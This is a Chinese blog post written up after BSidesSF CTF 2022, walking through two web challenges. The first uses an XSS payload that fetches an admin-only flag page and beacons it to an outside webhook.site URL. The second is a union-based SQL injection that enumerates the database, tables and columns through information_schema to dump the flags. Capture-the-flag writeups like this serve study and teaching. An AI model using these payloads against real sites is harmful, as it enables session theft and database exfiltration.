---
title: BSidesSF CTF
date: 2022-06-05 18:51:58
tags: 
       - 赛后复盘
       - CTF
categories: 
       - [赛后复盘]
       - [CTF]
---

这个比赛题目比较典型，有学习价值，只写了web

<!--more-->

## web-tutorial-1

> Can you use XSS to steal the flag from the admin?
>
> This challenge is sponsored by the Google Security Team. Come see our BSidesSF booth if you're interested in joining us!

![image446bec8bee21cf99.png](https://z4a.net/images/2022/06/05/image446bec8bee21cf99.png)

payload如下:

```
<script type="text/javascript"> (async function(){navigator.sendBeacon("https://webhook.site/08022f63-cc45-4e24-b4de-fea91c310419",await fetch("https://web-tutorial-1-a1ef0161.challenges.bsidessf.net/xss-one-flag").then(r=>r.text()).then(d=>d))})()    </script>
```

得到flag     CTF{XS5-W0rks-h3r3}![image6dfb5bf21991f3cf.png](https://z4a.net/images/2022/06/05/image6dfb5bf21991f3cf.png)

## Sequels: A New Bug

> We've decided to track known Jedi and Sith, so we put together this database. Hopefully there are no bugs?

最典型最基础的sql注入，通过这个题目再让我重新认识一下sql注入漏洞。

![image.png](https://z4a.net/images/2022/06/05/image.png)

这是一个查询功能，能查到的名字和信息下方已经给了，随便输入一天名字发现能出现，但是加个`‘`就查不到了，存在sql’注入漏洞。



![imaged052b7fa6b222cde.png](https://z4a.net/images/2022/06/05/imaged052b7fa6b222cde.png)

![image162c2235c2bb47c1.png](https://z4a.net/images/2022/06/05/image162c2235c2bb47c1.png)

> 对于sql注入漏洞的识别
>
> 首先可以试试单引号、双引号、单括号、双括号等看看是否报错，如果报错就八成存在SQL注入漏洞了。
>
> 其次在URL后面加and 1=1 、 and 1=2看页面是否显示一样，显示不一样的话就存在SQL注入漏洞了。

这道题首先是猜字段

```
Darth Bane' order by 3# 返回正常
```

![imagea0eeb25836e0488f.png](https://z4a.net/images/2022/06/05/imagea0eeb25836e0488f.png)

```
Darth Bane' order by 4# 错误
```

![image85e18abab9e8329e.png](https://z4a.net/images/2022/06/05/image85e18abab9e8329e.png)

```
Darth Bane' union select 1,2,3#
```

![image9470a40a596c59f3.png](https://z4a.net/images/2022/06/05/image9470a40a596c59f3.png)

然后爆数据库名

```
Darth Bane' union select 1,database(),3#
//得到数据库名是sequels1
```

![imaged87eb02ebba26a2f.png](https://z4a.net/images/2022/06/05/imaged87eb02ebba26a2f.png)

爆表名

```
1' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema="sequels1"#
//得到俩表，flags和jedi
```

![image01b5b372d130f8be.png](https://z4a.net/images/2022/06/05/image01b5b372d130f8be.png)

爆列名

```
1' union select 1,group_concat(column_name),3 from information_schema.columns where table_name="flags" #
```

![image90e879dc73490fc7.png](https://z4a.net/images/2022/06/05/image90e879dc73490fc7.png)

读取value数据，得到flag

![image8990ed9b74398721.png](https://z4a.net/images/2022/06/05/image8990ed9b74398721.png)

```
CTF{help_me_hacker_youre_my_only_hope}
```

